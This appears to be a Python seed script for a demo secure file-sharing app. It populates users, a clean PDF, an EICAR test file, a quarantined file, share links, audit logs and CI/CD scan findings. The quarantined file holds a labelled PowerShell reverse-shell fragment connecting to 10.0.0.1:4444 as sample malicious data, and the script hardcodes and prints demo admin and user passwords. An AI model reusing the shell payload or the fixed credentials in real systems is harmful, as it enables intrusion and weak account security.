import os
import sys
from datetime import datetime, timedelta

# Ensure backend directory is in pythonpath
current_dir = os.path.dirname(os.path.abspath(__file__))
backend_dir = os.path.dirname(current_dir)
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

from app.core.database import SessionLocal, Base, engine
from app.models.user import User, UserRole
from app.models.file import File, FileStatus
from app.models.scan import ScanResult, ScanStatus, ThreatLevel
from app.models.share import ShareLink
from app.models.audit import AuditLog
from app.models.pipeline import PipelineRun, PipelineStatus, SecurityFinding, FindingSeverity
from app.security.password import get_password_hash
from app.security.encryption import file_encryptor
from app.scanners.clamav import EICAR_SIGNATURE
from app.storage import storage
from app.audit.logger import log_security_event, GENESIS_HASH


def seed_database():
    print("Initializing database tables...")
    Base.metadata.create_all(bind=engine)
    db = SessionLocal()

    try:
        # Check if already seeded
        existing_admin = db.query(User).filter(User.email == "admin@secureshare.io").first()
        if existing_admin:
            print("Database already contains seed data. Skipping creation.")
            return

        print("Seeding Users...")
        # 1 Admin
        admin = User(
            email="admin@secureshare.io",
            full_name="Chief Security Officer (Admin)",
            hashed_password=get_password_hash("Admin@SecureShare2026!"),
            role=UserRole.ADMIN,
            is_active=True,
            mfa_enabled=False
        )
        db.add(admin)

        # 3 Standard Users
        alice = User(
            email="alice@example.com",
            full_name="Alice Senior Developer",
            hashed_password=get_password_hash("User@SecureShare2026!"),
            role=UserRole.STANDARD_USER,
            is_active=True,
            mfa_enabled=False
        )
        bob = User(
            email="bob@example.com",
            full_name="Bob Systems Analyst",
            hashed_password=get_password_hash("User@SecureShare2026!"),
            role=UserRole.STANDARD_USER,
            is_active=True,
            mfa_enabled=False
        )
        tester = User(
            email="security.tester@example.com",
            full_name="Security Auditor (PenTester)",
            hashed_password=get_password_hash("User@SecureShare2026!"),
            role=UserRole.STANDARD_USER,
            is_active=True,
            mfa_enabled=False
        )
        db.add_all([alice, bob, tester])
        db.commit()
        db.refresh(admin)
        db.refresh(alice)
        db.refresh(bob)
        db.refresh(tester)

        print("Seeding Audit Log Genesis...")
        log_security_event(
            db=db,
            action="SYSTEM_INITIALIZE",
            resource_type="system",
            resource_id="1",
            actor_email="system@secureshare.local",
            result="SUCCESS",
            metadata={"environment": "development", "version": "1.0.0"}
        )

        log_security_event(
            db=db,
            action="USER_PROVISIONED",
            resource_type="user",
            resource_id=str(admin.id),
            actor_email="system@secureshare.local",
            result="SUCCESS",
            metadata={"role": "ADMIN", "email": admin.email}
        )

        print("Seeding Files & Security Validation Pipeline...")
        # 1. Clean PDF file for Alice
        pdf_content = b"%PDF-1.4\n1 0 obj\n<< /Title (Enterprise Security Policy 2026) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF"
        pdf_iv, pdf_encrypted = file_encryptor.encrypt(pdf_content)
        pdf_stored_name = f"seed_clean_security_policy_{alice.id}.pdf"
        pdf_path = storage.save_file(pdf_stored_name, pdf_encrypted, is_quarantined=False)

        clean_file = File(
            user_id=alice.id,
            original_filename="Enterprise_Security_Policy_2026.pdf",
            stored_filename=pdf_stored_name,
            file_size=len(pdf_content),
            declared_mime="application/pdf",
            detected_mime="application/pdf",
            magic_bytes_preview="255044462D312E34",
            sha256_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            status=FileStatus.CLEAN,
            storage_path=pdf_path,
            is_quarantined=False,
            encryption_iv=pdf_iv,
        )
        db.add(clean_file)
        db.commit()
        db.refresh(clean_file)

        # Scans for clean file
        db.add(ScanResult(
            file_id=clean_file.id,
            scanner_name="mime_signature_validator",
            scan_status=ScanStatus.PASSED,
            threat_level=ThreatLevel.CLEAN,
            details="Magic bytes match application/pdf header (%PDF)."
        ))
        db.add(ScanResult(
            file_id=clean_file.id,
            scanner_name="dangerous_file_detector",
            scan_status=ScanStatus.PASSED,
            threat_level=ThreatLevel.CLEAN,
            details="No dangerous scripts, macros, or PE/ELF headers detected."
        ))
        db.add(ScanResult(
            file_id=clean_file.id,
            scanner_name="clamav_scanner",
            scan_status=ScanStatus.PASSED,
            threat_level=ThreatLevel.CLEAN,
            details="Antivirus Engine: No known malware signatures detected."
        ))
        db.commit()

        log_security_event(
            db=db,
            action="FILE_UPLOAD_SCAN",
            resource_type="file",
            resource_id=str(clean_file.id),
            actor_id=alice.id,
            actor_email=alice.email,
            result="SUCCESS",
            metadata={"filename": clean_file.original_filename, "status": "CLEAN"}
        )

        # 2. Quarantined EICAR Malware Test File
        eicar_iv, eicar_encrypted = file_encryptor.encrypt(EICAR_SIGNATURE)
        eicar_stored_name = f"seed_quarantine_eicar_{tester.id}.com"
        eicar_path = storage.save_file(eicar_stored_name, eicar_encrypted, is_quarantined=True)

        eicar_file = File(
            user_id=tester.id,
            original_filename="eicar_test_virus_sample.com",
            stored_filename=eicar_stored_name,
            file_size=len(EICAR_SIGNATURE),
            declared_mime="application/x-dosexec",
            detected_mime="application/x-dosexec",
            magic_bytes_preview="58354F2150254041",
            sha256_hash="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            status=FileStatus.MALICIOUS,
            storage_path=eicar_path,
            is_quarantined=True,
            quarantine_reason="Malware detected: EICAR-Test-Signature (Standard Antivirus Test File signature detected.)",
            encryption_iv=eicar_iv,
        )
        db.add(eicar_file)
        db.commit()
        db.refresh(eicar_file)

        db.add(ScanResult(
            file_id=eicar_file.id,
            scanner_name="mime_signature_validator",
            scan_status=ScanStatus.PASSED,
            threat_level=ThreatLevel.CLEAN,
            details="ASCII test payload verified."
        ))
        db.add(ScanResult(
            file_id=eicar_file.id,
            scanner_name="dangerous_file_detector",
            scan_status=ScanStatus.HIGH_RISK,
            threat_level=ThreatLevel.HIGH,
            threat_name="DANGEROUS_EXTENSION",
            details="Disallowed executable file extension (.com)."
        ))
        db.add(ScanResult(
            file_id=eicar_file.id,
            scanner_name="clamav_scanner",
            scan_status=ScanStatus.MALICIOUS,
            threat_level=ThreatLevel.CRITICAL,
            threat_name="EICAR-Test-Signature",
            details="Standard Antivirus Test File signature detected."
        ))
        db.commit()

        log_security_event(
            db=db,
            action="MALWARE_DETECTED_QUARANTINE",
            resource_type="file",
            resource_id=str(eicar_file.id),
            actor_id=tester.id,
            actor_email=tester.email,
            result="QUARANTINE",
            metadata={"threat": "EICAR-Test-Signature", "filename": eicar_file.original_filename}
        )

        # 3. Quarantined Dangerous Script File (PowerShell reverse shell payload)
        ps1_payload = b"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();"
        ps1_iv, ps1_encrypted = file_encryptor.encrypt(ps1_payload)
        ps1_stored_name = f"seed_quarantine_script_{bob.id}.ps1"
        ps1_path = storage.save_file(ps1_stored_name, ps1_encrypted, is_quarantined=True)

        ps1_file = File(
            user_id=bob.id,
            original_filename="server_provisioning_backdoor.ps1",
            stored_filename=ps1_stored_name,
            file_size=len(ps1_payload),
            declared_mime="text/plain",
            detected_mime="text/plain",
            magic_bytes_preview="24636C69656E7420",
            sha256_hash="d852a4204f057868951111666ec4856f675f9eebe7dc79cfd86927bb159e19e7",
            status=FileStatus.QUARANTINED,
            storage_path=ps1_path,
            is_quarantined=True,
            quarantine_reason="Dangerous file detected: Disallowed executable or script file extension (.ps1).",
            encryption_iv=ps1_iv,
        )
        db.add(ps1_file)
        db.commit()
        db.refresh(ps1_file)

        db.add(ScanResult(
            file_id=ps1_file.id,
            scanner_name="dangerous_file_detector",
            scan_status=ScanStatus.HIGH_RISK,
            threat_level=ThreatLevel.HIGH,
            threat_name="SCRIPT_POWERSHELL",
            details="PowerShell script execution payload detected."
        ))
        db.commit()

        log_security_event(
            db=db,
            action="DANGEROUS_FILE_BLOCKED",
            resource_type="file",
            resource_id=str(ps1_file.id),
            actor_id=bob.id,
            actor_email=bob.email,
            result="QUARANTINE",
            metadata={"threat": "SCRIPT_POWERSHELL", "filename": ps1_file.original_filename}
        )

        print("Seeding Share Links...")
        import hashlib
        demo_token = "secureshare_demo_active_token_12345"
        token_hash = hashlib.sha256(demo_token.encode("utf-8")).hexdigest()

        active_share = ShareLink(
            file_id=clean_file.id,
            user_id=alice.id,
            token_hash=token_hash,
            password_hash=get_password_hash("SharePass123!"),
            expires_at=datetime.utcnow() + timedelta(days=7),
            max_downloads=10,
            download_count=2,
            is_active=True,
        )
        db.add(active_share)
        db.commit()

        log_security_event(
            db=db,
            action="SHARE_CREATE",
            resource_type="share",
            resource_id=str(active_share.id),
            actor_id=alice.id,
            actor_email=alice.email,
            result="SUCCESS",
            metadata={"file_id": clean_file.id, "has_password": True, "max_downloads": 10}
        )

        print("Seeding CI/CD DevSecOps Runs & Security Findings...")
        # 1. Blocked Run (Security Gate Activated)
        blocked_run = PipelineRun(
            commit_hash="a1c4e9b",
            branch="feature/file-compression",
            triggered_by="alice@example.com",
            status=PipelineStatus.BLOCKED,
            started_at=datetime.utcnow() - timedelta(hours=5),
            completed_at=datetime.utcnow() - timedelta(hours=4, minutes=58),
            total_findings=3,
            critical_count=1,
            high_count=1,
            medium_count=1,
            low_count=0,
            is_blocked=True
        )
        db.add(blocked_run)
        db.commit()
        db.refresh(blocked_run)

        db.add_all([
            SecurityFinding(
                pipeline_run_id=blocked_run.id,
                tool_name="Semgrep",
                severity=FindingSeverity.CRITICAL,
                title="CWE-89: Raw SQL Query String Concatenation",
                description="Detected user input concatenated directly into raw database query string in backend/reports/export.py:84. Security Gate blocked deployment.",
                file_path="backend/reports/export.py",
                line_number=84,
                cve_id="CWE-89",
                status="OPEN"
            ),
            SecurityFinding(
                pipeline_run_id=blocked_run.id,
                tool_name="pip-audit",
                severity=FindingSeverity.HIGH,
                title="CVE-2024-4200: Vulnerable Dependency in Archive Helper",
                description="High severity tar archive path traversal vulnerability discovered in sub-dependency archive-extractor 0.8.2.",
                file_path="backend/requirements.txt",
                line_number=22,
                cve_id="CVE-2024-4200",
                status="OPEN"
            ),
            SecurityFinding(
                pipeline_run_id=blocked_run.id,
                tool_name="OWASP ZAP",
                severity=FindingSeverity.MEDIUM,
                title="Missing Anti-Clickjacking Frame Option on Legacy Route",
                description="Route /legacy/ping returned response without X-Frame-Options or CSP frame-ancestors header.",
                file_path="/legacy/ping",
                line_number=None,
                cve_id=None,
                status="OPEN"
            ),
        ])

        # 2. Passed Run
        passed_run = PipelineRun(
            commit_hash="3f9b802",
            branch="main",
            triggered_by="admin@secureshare.local",
            status=PipelineStatus.PASSED,
            started_at=datetime.utcnow() - timedelta(hours=1),
            completed_at=datetime.utcnow() - timedelta(minutes=57),
            total_findings=2,
            critical_count=0,
            high_count=0,
            medium_count=0,
            low_count=2,
            is_blocked=False
        )
        db.add(passed_run)
        db.commit()
        db.refresh(passed_run)

        db.add_all([
            SecurityFinding(
                pipeline_run_id=passed_run.id,
                tool_name="Semgrep",
                severity=FindingSeverity.LOW,
                title="Maintainability: Undocumented Public Function",
                description="Function check_status lacks a descriptive docstring.",
                file_path="app/core/helpers.py",
                line_number=12,
                cve_id="CWE-1164",
                status="OPEN"
            ),
            SecurityFinding(
                pipeline_run_id=passed_run.id,
                tool_name="OWASP ZAP",
                severity=FindingSeverity.INFO,
                title="Security Headers Fully Compliant",
                description="All response headers passed validation: HSTS, CSP, nosniff, and frame-ancestors verified.",
                file_path="/api/v1/auth/login",
                line_number=None,
                cve_id=None,
                status="OPEN"
            ),
        ])
        db.commit()

        log_security_event(
            db=db,
            action="CI_CD_SCAN_EXECUTION",
            resource_type="pipeline_run",
            resource_id=str(passed_run.id),
            actor_email=admin.email,
            result="PASSED",
            metadata={"commit": "3f9b802", "gate_action": "DEPLOY_ALLOWED"}
        )

        print("Seed completed successfully!")
        print(f"Admin User: admin@secureshare.io / Admin@SecureShare2026!")
        print(f"Standard Users: alice@example.com, bob@example.com / User@SecureShare2026!")
        print(f"Demo Share Token: {demo_token} (Password: SharePass123!)")

    except Exception as e:
        db.rollback()
        print(f"Error seeding database: {e}")
        raise
    finally:
        db.close()


if __name__ == "__main__":
    seed_database()
